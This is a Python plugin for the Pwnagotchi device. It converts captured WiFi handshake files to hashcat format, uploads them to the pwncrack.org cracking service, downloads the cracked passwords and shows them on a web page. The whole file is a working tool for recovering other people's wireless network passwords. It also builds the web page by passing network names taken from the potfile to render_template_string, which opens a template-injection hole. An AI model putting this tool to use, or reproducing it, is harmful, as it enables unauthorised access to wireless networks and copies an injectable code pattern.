import time
import os
import subprocess
import requests
import logging
import socket
from pwnagotchi.plugins import Plugin
import pwnagotchi

class UploadConvertPlugin(Plugin):
    __author__ = 'Terminatoror'
    __version__ = '1.0.2'
    __license__ = 'GPL3'
    __description__ = 'Converts .pcap files to .hc22000 and uploads them to pwncrack.org when internet is available.'

    def __init__(self):
        self.server_url = 'http://pwncrack.org/upload_handshake'  # Leave this as is
        self.potfile_url = 'http://pwncrack.org/download_potfile_script'  # Leave this as is
        self.timewait = 600
        self.last_run_time = 0
        self.key = ""

    def on_loaded(self):
        logging.info('[pwncrack] loading')

    def on_config_changed(self, config):
        self.handshake_dir = config["bettercap"].get("handshakes")
        self.key = self.options.get('key', "")  # Change this to your key
        self.whitelist = config["main"].get("whitelist", [])
        self.combined_file = os.path.join(self.handshake_dir, 'combined.hc22000')
        self.potfile_path = os.path.join(self.handshake_dir, 'cracked.pwncrack.potfile')
        self.last_upload_path = os.path.join(self.handshake_dir, '.pwncrack_last_up')
        self.timewait = self.options.get('timewait', 600)

    def on_internet_available(self, agent):
        current_time = time.time()
        remaining_wait_time = self.timewait - (current_time - self.last_run_time)
        if remaining_wait_time > 0:
            logging.debug(f"[pwncrack] Waiting {remaining_wait_time:.1f} more seconds before next run.")
            return
        self.last_run_time = current_time
        if self.key == "":
            logging.warn("PWNCrack enabled, but no api key specified. Add a key to config.toml")
            return

        logging.info(f"[pwncrack] Running upload process. waiting: {self.timewait} seconds.")
        try:
            self._convert_and_upload()
            self._download_potfile()
            self.last_run_time = current_time
        except Exception as e:
            logging.error(f"[pwncrack] Error occurred during upload process: {e}", exc_info=True)

    def _is_pcap(self, filename):
        return filename.endswith('.pcap') or filename.endswith('.pcapng')
        
    def _convert_and_upload(self):
        # Convert all .pcap files to .hc22000, excluding files matching whitelist items
        last_up_time = os.path.getmtime(self.last_upload_path) if os.path.isfile(self.last_upload_path) else 0
        pcap_files = [f for f in os.listdir(self.handshake_dir)
                      if self._is_pcap(f) and os.path.getmtime(os.path.join(self.handshake_dir,f)) > last_up_time and not any(item in f for item in self.whitelist)]
        if pcap_files:
            tmp_file = os.path.join(self.handshake_dir, '.pwncrack_uploading')
            with open(tmp_file, 'w') as fout:
                fout.write("\n".join(pcap_files))

            # write list of files to a temporary marker file. move to real path if success
            for pcap_file in pcap_files:
                subprocess.run(['hcxpcapngtool', '-o', self.combined_file, os.path.join(self.handshake_dir, pcap_file)])
                self.last_run_time = time.time()   # because it can take a while with a lot of pcaps

            # Ensure the combined file is created
            if not os.path.exists(self.combined_file):
                open(self.combined_file, 'w').close()

            # Upload the combined .hc22000 file
            with open(self.combined_file, 'rb') as file:
                files = {'handshake': file}
                data = {'key': self.key}
                response = requests.post(self.server_url, files=files, data=data)

            # Log the response
            logging.info(f"[pwncrack] Upload response: {response.json()}")
            if response.status_code == 200:
                # move temporary marker file in place for next check
                os.rename(tmp_file, self.last_upload_path)
            os.remove(self.combined_file)  # Remove the combined.hc22000 file
        else:
            logging.info("[pwncrack] No .pcap files found to convert (or all files are whitelisted).")

    def _download_potfile(self):
        response = requests.get(self.potfile_url, params={'key': self.key})
        if response.status_code == 200:
            with open(self.potfile_path, 'w') as file:
                file.write(response.text)
            logging.info(f"[pwncrack] Potfile downloaded to {self.potfile_path}")
        else:
            logging.error(f"[pwncrack] Failed to download potfile: {response.status_code}")
            logging.error(f"[pwncrack] {response.json()}")  # Log the error message from the server

    def on_unload(self, ui):
        logging.info('[pwncrack] unloading')

    def on_webhook(self, path, request):
        from flask import abort
        from flask import render_template_string
        html_head = '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="csrf_token" content="{{ csrf_token() }}"><link href="https://fonts.cdnfonts.com/css/white-rabbit-2" rel="stylesheet"><title>#title#</title><style>body{height:100%;background-color:#333;color:#fff;direction:ltr;font-family:"White Rabbit","Courier New",Courier,monospace;font-size:2em;font-variant-numeric:slashed-zero;text-align:center;text-shadow:0 1px 3px rgba(0,0,0,.5);unicode-bidi:bidi-override}h1,h3{color:#0C0;padding-bottom:10px;text-shadow:-1px-1px 0 rgba(0,0,0,.3)}a{color:#0C0;text-decoration:none}a:hover{font-weight:bold;text-decoration:underline}table{width:50%;border-collapse:collapse;margin:20px auto}table th,table td{border:1px solid#1e1e1e;padding:1rem;text-align:left;font-size:1.5rem}table thead{background-color:#1e1e1e}.note{font-size:1em;margin-top:20px;line-height:1.5em}small{font-size:1.2rem;margin-bottom:1rem;display:block;line-height:1.5rem}@media(max-width:1199.98px){table{width:80%}table th,table td{font-size:2.5rem}}</style></head><body>'
        html_foot = f'<div class="note"><p><a href="https://pwncrack.org" target="_blank">pwncrack.org</a><br />key: {self.key}</p><p><a href="https://pwncrack.org/nets.html" target="_blank">Your Nets</a> | <a href="https://pwncrack.org/leaderboard.html" target="_blank">Leaderboard</a> | <a href="https://pwncrack.org/stats.html" target="_blank">Global Stats</a></p></div></body></html>'
        if not os.path.isfile(self.potfile_path):
            html_page  = html_head.replace('#title#','pwncrack | No Passwords!')
            html_page += '<h3>No downloaded passwords yet.</h3>'
            html_page += html_foot
            return render_template_string(html_page), 200
        try:
            if request.method == "GET":
                if path == "/" or not path:
                    html_page  = html_head.replace('#title#','pwncrack | Passwords!')
                    html_page += '<h1>Results</h1><table><thead><tr><th>AP</th><th>Pass</th></tr></thead><tbody>'
                    with open(self.potfile_path, 'r') as file:
                        for line in file:
                            bits = line.strip().split(":")
                            if len(bits) >= 5:
                                _,_,_,AP,Pass = bits
                                html_page += f'<tr><td>{AP}</td><td>{Pass}</td></tr>'
                    html_page += '</tbody></table>'
                    html_page += html_foot
                    return render_template_string(html_page), 200
                else:
                    abort(404)
        except Exception as e:
            logging.error(f"[pwncrack] {repr(e)}")
            html_page  = html_head.replace('#title#','pwncrack | Error!')
            html_page += repr(e)
            html_page += html_foot
            return render_template_string(html_page), 404
